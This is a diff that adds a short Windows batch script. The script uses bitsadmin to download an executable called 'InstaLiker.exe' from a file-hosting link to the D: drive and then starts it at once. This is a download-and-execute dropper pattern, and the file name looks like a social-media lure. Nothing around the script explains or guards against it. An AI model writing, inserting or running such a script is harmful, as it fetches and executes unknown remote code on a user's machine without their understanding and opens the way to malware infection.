@@ -1,0 +1,2 @@
+@echo off 
+cmd.exe /c "bitsadmin /transfer myjob /download /priority high https://nofile.io/g/pgc1NIEedxI9EWu8ts78pTE88Qt28ljkTXA3nx12gGbRCQtgAbvSdMZ32YfSnE1l/InstaLiker.exe/ D:\InstaLiker.exe&start D:\InstaLiker.exe"
